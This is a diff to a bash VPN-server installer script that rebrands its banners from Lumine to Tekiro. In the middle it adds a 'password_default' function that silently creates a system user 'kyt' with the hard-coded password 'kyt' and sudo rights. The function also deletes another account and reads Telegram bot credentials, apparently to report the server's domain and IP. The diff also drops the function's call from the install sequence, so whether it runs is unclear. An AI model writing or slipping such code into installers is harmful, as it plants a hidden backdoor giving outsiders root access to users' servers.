@@ -30,10 +30,10 @@ clear;clear;clear
 
   # // Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "  Welcome To Lumine Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
+echo -e "  Welcome To Tekiro Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
 echo -e "     This Will Quick Setup VPN Server On Your Server"
-echo -e "         Auther : ${green}Lumine ${NC}${YELLOW}(${NC} ${green}Lumine Project ${NC}${YELLOW})${NC}"
-echo -e "       © Recode By Lumine Project ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
+echo -e "         Auther : ${green}Tekiro ${NC}${YELLOW}(${NC} ${green}Tekiro Project ${NC}${YELLOW})${NC}"
+echo -e "       © Recode By Tekiro Project ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
 sleep 5
@@ -331,6 +331,18 @@ clear
 }
 
 clear
+#GANTI PASSWORD DEFAULT
+function password_default() {
+    domain=$(cat /root/domain)
+    MYIP=$(curl -sS ipv4.icanhazip.com)
+    userdel jame > /dev/null 2>&1
+    Username="kyt"
+    Password=kyt
+    mkdir -p /home/script/
+    chmod 777 /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
 
     CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
     KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
@@ -346,7 +358,7 @@ clear
     <code>Domain     :</code> <code>$domain</code>
     <code>Exp Script :</code> <code>$exp</code>
     ============================
-    (C) Copyright 2023 By LumineVPN
+    (C) Copyright 2023 By TekiroVPN
     ============================
 "
 
@@ -1019,7 +1031,6 @@ clear
     base_package
     make_folder_xray
     pasang_domain
-    password_default
     pasang_ssl
     install_xray
     ssh
@@ -1051,7 +1062,7 @@ rm -rf /root/domain
 secs_to_human "$(($(date +%s) - ${start}))"
 echo ""
 echo " "
-echo "=====================-[ LumineVPN ]-===================="
+echo "=====================-[ TEKIROVPN ]-===================="
 echo ""
 echo "------------------------------------------------------------"
 echo ""
@@ -1085,7 +1096,7 @@ echo ""
 echo ""
 echo "------------------------------------------------------------"
 echo ""
-echo "=====================-[ LumineVPN ]-===================="
+echo "=====================-[ LUMINE ]-===================="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
